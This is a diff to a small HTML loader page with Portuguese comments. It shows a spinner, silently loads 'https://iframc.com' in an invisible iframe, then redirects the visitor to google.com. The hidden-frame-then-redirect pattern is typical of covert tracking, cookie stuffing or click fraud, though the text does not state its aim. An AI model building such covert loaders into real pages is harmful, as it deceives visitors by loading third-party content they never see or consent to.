@@ -22,7 +22,7 @@
             height: 20px;
             border-radius: 50%;
             background-color: green;
-            animation: spin 1s linear infinite; /* Corrigi o valor para 1s para um giro mais suave */
+            animation: spin 1s linear infinite; /* Animação */
         }
         .text {
             margin-left: 10px;
@@ -34,7 +34,7 @@
             100% { transform: rotate(360deg); }
         }
         iframe {
-            display: none;
+            display: none; /* Escondendo o iframe */
         }
     </style>
 </head>
@@ -46,11 +46,35 @@
 </div>
 
 <!-- Iframe invisível -->
-<iframe id="hiddenIframe" src="" onload="onIframeLoad()"></iframe>
+<iframe id="hiddenIframe" src=""></iframe>
 
 <script>
     // URLs definidas
-    const lnkfrm = 'https://iframc.com';  // URL do iframe invisível
-    const lnkdtn = 'https://google.com';  // URL para redirecionar após carregamento completo
+    const lnkfrm = 'https://iframc.com';  // URL do iframe
+    const lnkdtn = 'https://google.com';  // URL de destino final
 
-    // Função chamada quando o iframe é carregad
+    // Função chamada quando o iframe é carregado completamente
+    function onIframeLoad() {
+        console.log('Iframe carregado!');
+
+        // Espera para garantir que o iframe foi processado
+        setTimeout(() => {
+            console.log('Redirecionando...');
+            window.location.href = lnkdtn; // Redirecionamento final
+        }, 500); // Atraso de 500 ms
+    }
+
+    // Carregando o iframe
+    window.onload = function() {
+        const iframe = document.getElementById('hiddenIframe');
+        
+        // Adiciona o evento onload ao iframe
+        iframe.onload = onIframeLoad;
+
+        // Define a URL do iframe
+        iframe.src = lnkfrm;
+    };
+</script>
+
+</body>
+</html>
